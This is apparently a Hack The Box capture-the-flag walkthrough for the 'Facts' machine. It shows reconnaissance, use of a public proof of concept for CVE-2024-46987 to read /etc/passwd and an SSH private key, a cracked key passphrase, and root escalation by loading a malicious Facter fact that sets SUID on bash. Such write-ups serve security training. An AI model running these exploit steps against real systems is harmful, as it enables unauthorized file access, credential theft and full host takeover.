
# HTB Machine: Facts - Penetration Test Report

**Difficulty:** Easy  
**Platform:** Linux  
**Rating:** 4.5 (1280 votes)  
**XP Reward:** 585

---

## Reconnaissance

### Nmap Scan
```bash
sudo nmap -sV -sC 10.129.219.7 -Pn
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
```

### DNS Configuration
```bash
sudo echo "ipaddress facts.htb"
```

### Directory Fuzzing
```bash
ffuf -u http://facts.htb/FUZZ -w /path/to/raft-small-directories.txt -t 50
```

**Discovered endpoints:**
- `/admin` [302]
- `/search` [200]
- `/en` [200]
- `/page` [200]
- `/error` [500]
- `/ajax` [200]
- `/rss` [200]
- `/sitemap` [200]
- `/captcha` [200]
- `/post` [200]
- `/robots` [200]

---

## Vulnerability Discovery

### CMS Identification
- **CMS:** Camaleon CMS 2.9.0
- **Vulnerabilities found:** Privilege Escalation, Path Traversal, RCE

### CAPTCHA Generation
```bash
curl -s "http://facts.htb/captcha?len=5" -o captcha.png
```

---

## Exploitation - Path Traversal (CVE-2024-46987)

### POC Repository
```bash
git clone https://github.com/Goultarde/CVE-2024-46987.git
```

### Reading /etc/passwd
```bash
python3 CVE-2024-46987.py -u http://facts.htb -l weed -p 1234 /etc/passwd
```

**Relevant users discovered:**
```
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

---

## User Flag

### Reading William's User Flag
```bash
python3 CVE-2024-46987.py -u http://facts.htb -l weed -p 1234 /home/william/user.txt
```

**User Flag:** `a29e392.......................`

---

## Privilege Escalation

### Extracting SSH Key
```bash
python3 CVE-2024-46987.py -u http://facts.htb -l weed -p 1234 /home/trivia/.ssh/id_ed25519
```

### Save Trivia's SSH Key
```bash
cat > trivia_id_ed25519 << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAqlw1GrV
YjBXiHArSQoS6JAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIJ1KlZPUwYWgnFIU
oBmfZrZ8IRqBQcIIA1sT6XHheMozAAAAoPvmFpMbXIWvQOjCODYY2H507+Hc5qJhuIPZGk
UOcJZJUf0+5nRsYK+cLD2bOv5j3I2dKmOsTrQANDx24gi0mv9A0zsHpWrKVmUB1VuQxtW1
x4uOsgN+6x7SFghBNfacb5V7DlbJUfR3ekzFSSnopGfcdNGsCzbr6zz3NY3XbAwaPtsb85
uqGjaa8eMHgA6PAqbb/+vlOnw4nyqCCRVLhOw=
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 trivia_id_ed25519
```

### SSH Key Password Cracking
**Password found:** `dragonballz`

```bash
ssh -i trivia_id_ed25519 trivia@facts.htb
# Password: dragonballz
```

---

## Root Access

### Sudo Privileges
```bash
sudo -l
```
**Output:**
```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

### Privilege Escalation via Facter
```bash
# Create malicious fact directory
mkdir -p /tmp/malicious_facts

# Create Ruby fact file
echo 'Facter.add("pwned") do
  setcode do
    system("chmod +s /bin/bash")
  end
end' > /tmp/malicious_facts/pwn.rb

# Execute facter with custom directory
sudo /usr/bin/facter --custom-dir /tmp/malicious_facts pwned
```

### Verify SUID Bit
```bash
ls -l /bin/bash
# -rwsr-sr-x 1 root root 1740896 Mar  5  2025 /bin/bash
```

### Spawn Root Shell
```bash
bash -p
```

**Root Access Confirmed:**
```bash
bash-5.2# id
uid=1000(trivia) gid=1000(trivia) euid=0(root) egid=0(root) groups=0(root),1000(trivia)
```

---

## Root Flag
```bash
bash-5.2# cat /root/root.txt
3f3b1a.......................
```

**Root Flag:** `3f3b1a.......................`

